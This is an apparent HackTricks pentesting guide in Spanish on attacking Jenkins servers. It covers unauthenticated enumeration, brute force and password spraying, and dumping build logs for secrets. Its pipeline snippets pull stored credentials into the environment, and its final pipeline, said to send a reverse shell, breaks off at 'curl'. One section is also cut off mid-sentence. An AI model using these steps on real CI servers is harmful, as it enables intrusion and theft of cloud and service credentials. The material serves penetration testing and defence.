# Seguridad de Jenkins

<details>

<summary><strong>¡Apoya a HackTricks y obtén beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **última versión de PEASS o descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>

## Información básica

Jenkins ofrece una forma sencilla de configurar un entorno de **integración continua** o **entrega continua** (CI/CD) para casi **cualquier** combinación de **lenguajes** y repositorios de código fuente utilizando pipelines, así como automatizar otras tareas de desarrollo rutinarias. Si bien Jenkins no elimina la **necesidad de crear scripts para pasos individuales**, le brinda una forma más rápida y sólida de integrar toda su cadena de herramientas de compilación, prueba y implementación de lo que puede construir fácilmente usted mismo.\
Definición de [aquí](https://www.infoworld.com/article/3239666/what-is-jenkins-the-ci-server-explained.html).

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## Enumeración sin autenticación

Para buscar páginas interesantes de Jenkins sin autenticación como (_/people_ o _/asynchPeople_, que lista los usuarios actuales) puedes usar:

```
msf> use auxiliary/scanner/http/jenkins_enum
```

Comprueba si puedes ejecutar comandos sin necesidad de autenticación:

```
msf> use auxiliary/scanner/http/jenkins_command
```

Sin credenciales, puedes mirar dentro de la ruta _**/asynchPeople/**_ o _**/securityRealm/user/admin/search/index?q=**_ para obtener **nombres de usuario**.

Es posible que puedas obtener la versión de Jenkins desde la ruta _**/oops**_ o _**/error**_

![](<../../.gitbook/assets/image (48).png>)

### Vulnerabilidades conocidas

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## Inicio de sesión

En la información básica puedes comprobar **todas las formas de iniciar sesión en Jenkins**:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Registro

Podrás encontrar instancias de Jenkins que **te permiten crear una cuenta e iniciar sesión en ella. Tan simple como eso.**

### **Inicio de sesión SSO**

También, si la funcionalidad/plugins de **SSO** estuvieran presentes, deberías intentar **iniciar sesión** en la aplicación utilizando una cuenta de prueba (es decir, una cuenta de **Github/Bitbucket** de prueba). Truco de [**aquí**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/).

### Fuerza bruta

**Jekins** no implementa ninguna **política de contraseñas** o **mitigación de fuerza bruta de nombres de usuario**. Entonces, siempre debes intentar **atacar por fuerza bruta a los usuarios** porque probablemente se estén utilizando **contraseñas débiles** (incluso **nombres de usuario como contraseñas** o **nombres de usuario al revés como contraseñas**).

```
msf> use auxiliary/scanner/http/jenkins_login
```

### Spraying de contraseñas

Usa [este script de Python](https://github.com/gquere/pwn\_jenkins/blob/master/password\_spraying/jenkins\_password\_spraying.py) o [este script de PowerShell](https://github.com/chryzsh/JenkinsPasswordSpray).

### Bypass de lista blanca de IP

Muchas organizaciones combinan sistemas de gestión de control de origen (SCM) basados en **SaaS** (como GitHub o GitLab) con una solución de CI autohospedada interna (por ejemplo, Jenkins, TeamCity) que permite a estos sistemas de CI recibir eventos de webhook de los proveedores de control de origen de SaaS, con el simple propósito de activar trabajos de canalización.

Por lo tanto, las organizaciones **ponen en lista blanca** los **rangos de IP** del **SCM** permitiéndoles llegar al sistema de CI interno con **webhooks**. Sin embargo, ten en cuenta cómo **cualquiera** puede crear una **cuenta** en Github o Gitlab y hacer que **active un webhook** que podría enviar una solicitud a ese **sistema de CI interno**.

{% content-ref url="scm-ip-whitelisting-bypass.md" %}
[scm-ip-whitelisting-bypass.md](scm-ip-whitelisting-bypass.md)
{% endcontent-ref %}

## Abusos internos de Jenkins

En estos escenarios vamos a suponer que tienes una cuenta válida para acceder a Jenkins.

{% hint style="warning" %}
Dependiendo del mecanismo de **Autorización** configurado en Jenkins y los permisos del usuario comprometido, **podrás o no realizar los siguientes ataques**.
{% endhint %}

Para obtener más información, consulta la información básica:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Listado de usuarios

Si has accedido a Jenkins, puedes listar otros usuarios registrados en [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)

### Volcado de compilaciones para encontrar secretos en texto claro

Usa [este script](https://github.com/gquere/pwn\_jenkins/blob/master/dump\_builds/jenkins\_dump\_builds.py) para volcar las salidas de la consola de compilación y las variables de entorno de compilación para encontrar, con suerte, secretos en texto claro.

```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```

### **Robo de credenciales SSH**

Si el usuario comprometido tiene **suficientes privilegios para crear/modificar un nuevo nodo de Jenkins** y ya se almacenan credenciales SSH para acceder a otros nodos, podría **robar
### Comprobación de variables de entorno

Es posible declarar **variables de entorno de texto claro** para toda la canalización o para etapas específicas. Estas variables de entorno **no deben contener información confidencial**, pero un atacante siempre podría **ver todas las configuraciones de la canalización**/Jenkinsfiles:

```bash
pipeline {
    agent {label 'built-in'}
    environment {
        GENERIC_ENV_VAR = "Test pipeline ENV variables."
    }

    stages {
        stage("Build") {
                environment {
                    STAGE_ENV_VAR = "Test stage ENV variables."
                }
                steps {
```

### Volcado de secretos

Para obtener información sobre cómo se tratan los secretos por lo general en Jenkins, consulte la información básica:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Las credenciales pueden estar **limitadas a proveedores globales** (`/credentials/`) o a **proyectos específicos** (`/job/<nombre-del-proyecto>/configure`). Por lo tanto, para **filtrar todos ellos** es necesario **comprometer al menos todos los proyectos** que contienen secretos y ejecutar canalizaciones personalizadas/envenenadas.

Hay otro problema, para obtener un **secreto dentro del env** de una canalización, es necesario **conocer el nombre y el tipo del secreto**. Por ejemplo, si intenta **cargar** un secreto de **`usernamePassword`** como un secreto de **`string`**, obtendrá este **error**:

```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```

Aquí tiene la forma de cargar algunos tipos de secretos comunes:

```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
    sh '''
        env #Buscar USERNAME y PASS
    '''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
    sh '''
        env #Buscar SECRET
    '''                 
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
    sh '''
        env # Buscar USERPASS
    '''
}

# También puede cargar varias variables de entorno a la vez
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
                 string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
     sh '''
        env
    '''
}
```

Al final de esta página puede **encontrar todos los tipos de credenciales**: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
La mejor manera de **filtrar todos los secretos a la vez** es **comprometer** la **máquina Jenkins** (ejecutando un shell inverso en el **nodo integrado**, por ejemplo) y luego **filtrar** las **claves maestras** y los **secretos cifrados** y descifrarlos sin conexión.\
Más información sobre cómo hacer esto en la sección [Nodos y agentes](./#nodos-y-agentes) y en la sección [Post Explotación](./#post-exploitation).
{% endhint %}

### Disparadores

Desde [la documentación](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers): La directiva `triggers` define las **formas automatizadas en que se debe volver a activar la canalización**. Para las canalizaciones que están integradas con una fuente como GitHub o BitBucket, es posible que no sea necesario `triggers`, ya que la integración basada en webhooks probablemente ya esté presente. Los desencadenantes disponibles actualmente son `cron`, `pollSCM` y `upstream`.

Ejemplo de cron:

```bash
triggers { cron('H */4 * * 1-5') }
```

Consulte **otros ejemplos en la documentación**.

### Nodos y agentes

Una **instancia de Jenkins** puede tener **diferentes agentes ejecutándose en diferentes máquinas**. Desde la perspectiva de un atacante, el acceso a diferentes máquinas significa **diferentes credenciales de la nube potenciales** para robar o **diferente acceso a la red** que podría ser abusado para explotar otras máquinas.

Para obtener más información, consulte la información básica:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Puede enumerar los **nodos configurados** en `/computer/`, generalmente encontrará el **`Nodo integrado`** (que es el nodo que ejecuta Jenkins) y potencialmente más:

![](<../../.gitbook/assets/image (25).png>)

Es **especialmente interesante comprometer el nodo integrado** porque contiene información confidencial de Jenkins.

Para indicar que desea **ejecutar** la **canalización** en el **nodo Jenkins integrado**, puede especificar dentro de la canalización la siguiente configuración:

```bash
pipeline {
    agent {label 'built-in'}
```

### Ejemplo completo

Canalización en un agente específico, con un disparador cron, con variables de entorno de canalización y etapa, cargando 2 variables en un paso y enviando un shell inverso:

```bash
pipeline {
    agent {label 'built-in'}
    triggers { cron('H */4 * * 1-5') }
    environment {
        GENERIC_ENV_VAR = "Test pipeline ENV variables."
    }

    stages {
        stage("Build") {
                environment {
                    STAGE_ENV_VAR = "Test stage ENV variables."
                }
                steps {
            withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
                     string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
                sh '''
                    curl